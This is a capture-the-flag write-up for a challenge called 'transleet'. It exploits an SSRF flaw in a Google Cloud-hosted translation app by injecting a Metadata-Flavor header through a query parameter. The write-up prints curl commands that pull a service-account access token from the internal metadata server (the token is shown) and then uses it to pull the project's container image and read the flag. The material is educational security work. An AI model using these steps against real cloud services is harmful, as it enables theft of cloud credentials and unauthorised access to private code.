# Writeup - transleet

This challenge is intended to demonstrate a well known vulnerability that is often present when an application is vulnerable to SSRF and is run in the cloud (mainly aws and gcloud but it may work for others too).

Upon navigating to the site we are presented with just a text box with a placeholder of `https://transleet.chal.hackmac.xyz/manifesto.txt?H="Accept=text/html"`.
If we submit this value we are presented with the hackers manifesto translated into leetspeak.

Visiting https://transleet.chal.hackmac.xyz/manifesto.txt?H="Accept=text/html" presents us with the hackers manifesto as well except in plain english this time.

If we try and put another url in the box such as http://example.com we can see that we get back the translated source code of example.com's main page.

Now let's try a [request bin](https://requestbin.io/) of our own.
Once we catch that request we can see the following headers are present
```
Cloudfront-Is-Smarttv-Viewer: false
Host: requestbin.io
X-Request-Id: bd984a0a-63d5-4f24-baa6-60b95d614f87
Cloudfront-Viewer-Country: US
Cloudfront-Is-Tablet-Viewer: false
Via: 1.1 5ffea377a15bf1a86dfde6a87b4a0a36.cloudfront.net (CloudFront), 1.1 vegur
Cloudfront-Forwarded-Proto: https
Accept: */*
Total-Route-Time: 0
Cloudfront-Is-Desktop-Viewer: true
X-Amz-Cf-Id: 21NwAKnzNzmBRJ7xFkD7wJIOVZU76C-aR9oLDOU6sDwHFw5QA2hVuA==
User-Agent: node-fetch
Cloudfront-Is-Mobile-Viewer: false
Connection: close
Accept-Encoding: gzip,deflate,br
Connect-Time: 0
```

Something to notice is the User-Agent header of node-fetch. Looks like the server is making live requests on our behalf. So we may have a SSRF vulnerability.

Another thing to notice is where the challenge is running.
If we perform a dns lookup on the challenge domain we can see that it is hosted on gcloud.
```
❯ dig transleet.chal.hackmac.xyz

; <<>> DiG 9.10.6 <<>> transleet.chal.hackmac.xyz
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18316
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;transleet.chal.hackmac.xyz.	IN	A

;; ANSWER SECTION:
transleet.chal.hackmac.xyz. 41	IN	CNAME	ghs.googlehosted.com.
ghs.googlehosted.com.	249	IN	A	142.250.204.19

;; Query time: 89 msec
;; SERVER: 192.168.0.1#53(192.168.0.1)
;; WHEN: Wed Jul 07 14:48:53 AEST 2021
;; MSG SIZE  rcvd: 105
```

So we can try and query the internal gcloud metadata server for the applications service-account token.
The metadata server is accessible internally at 169.254.169.254 as well as metadata.google.internal.

Let's try
```
curl 'https://transleet.chal.hackmac.xyz/transleet' \
	-H 'Content-Type: multipart/form-data; boundary=---------------------------293279164839524248663009936876' \
	--data-binary $'-----------------------------293279164839524248663009936876\r\nContent-Disposition: form-data; name="q"\r\n\r\nhttp://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token\r\n-----------------------------293279164839524248663009936876--\r\n'
```

We get back
```
{"text":"M1551n6 r3qu1r3d h34d3r: M374d474-phl4v0r\n"}
```

Looks like we need to add the `Metadata-flavor: Google` header to our requests. This is documented [here](https://cloud.google.com/compute/docs/storing-retrieving-metadata#querying) and is a relatively new feature, presumably designed to help fight against these types of SSRF attacks.

Well how do we control the headers that the server sends? If we remember earlier, there was a weird looking query parameter in the placeholder value `H="Accept=text/html"` which looks suspiciously just like a HTTP header. Maybe we can use this to control what headers the server sends?

Let's try first to our request bin:
Submitting `https://requestbin.io/12c0dyy1?H=test=yes` in the submission box yields us with the following request in our request bin
```
Cloudfront-Is-Smarttv-Viewer: false
Host: requestbin.io
X-Request-Id: 73af8c98-c126-4051-a912-553e17d7d6f5
Cloudfront-Viewer-Country: US
Cloudfront-Is-Tablet-Viewer: false
Test: yes
Via: 1.1 90abbcc969ab958776c0b1211c74eea9.cloudfront.net (CloudFront), 1.1 vegur
Cloudfront-Forwarded-Proto: https
Accept: */*
Total-Route-Time: 0
Cloudfront-Is-Desktop-Viewer: true
X-Amz-Cf-Id: 38Z5BIIpZktPz2u2DJlN_BrSZ0fy-uIEoQgIbvMhFpPeM0zsy0kqSw==
User-Agent: node-fetch
Cloudfront-Is-Mobile-Viewer: false
Connection: close
Accept-Encoding: gzip,deflate,br
Connect-Time: 0
```

Notice the `Test: yes` header! So we can use this to query the internal metadata API.
Let's get the service-account token and see what we can do.

## Get service account token
```
curl 'https://transleet.chal.hackmac.xyz/transleet' -H 'Content-Type: multipart/form-data; boundary=---------------------------293279164839524248663009936876' --data-binary $'-----------------------------293279164839524248663009936876\r\nContent-Disposition: form-data; name="q"\r\n\r\nhttp://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token?H=Metadata-flavor=Google\r\n-----------------------------293279164839524248663009936876--\r\n'

{"text":"{\"access_token\":\"ya29.c.KqEBBgjlYJSjml6qyzxGG2DdGIw_2xuWubk70XYFi4hZSAkLyRftOKxy7qx0R_Dl6b_JnFKWbbdfvtzcZgJ0NwBxoDP_ezQHQO58gFdLmIP4_O1SY8uwFrRIeXWamacUIfxAM2o3o_4ehjKiqhunzzYUOuwFZCckhG6GgrdDj-yMYcct1Unm_f56Xx99WvFVcJ0da4fvsjPVWoJdaAI_K84PTDc\",\"expires_in\":1799,\"token_type\":\"Bearer\"}"}*
```

Okay now that we've got the service account token we can check to see if the project has any container images that we can try to pull down and inspect the source code locally.

## Get project name - transleet
`curl https://iam.googleapis.com/v1/projects/728253287091/serviceAccounts\?alt\=json\&pageSize\=100 -H "Authorization: Bearer ya29.c...`

## Get images
`curl https://gcr.io/v2/transleet/tags/list -H "Authorization: Bearer ya29.c...`

## Docker login
`docker login -u oauth2accesstoken -p "$TOKEN" https://gcr.io`

## Docker pull
`docker pull gcr.io/transleet/transleet:latest`

Now we can run the container and print the flag

## Run image
`docker run -it gcr.io/transleet/transleet:latest bash`

```
root@9dce501826eb:/app# ls
README.md  build  flag	node_modules  package-lock.json  package.json  src  static  svelte.config.js  tsconfig.json
root@9dce501826eb:/app# cat flag
HACKMAC{5n34ky_m374d474.6006l3.1n73rn4l}
root@9dce501826eb:/app#
```
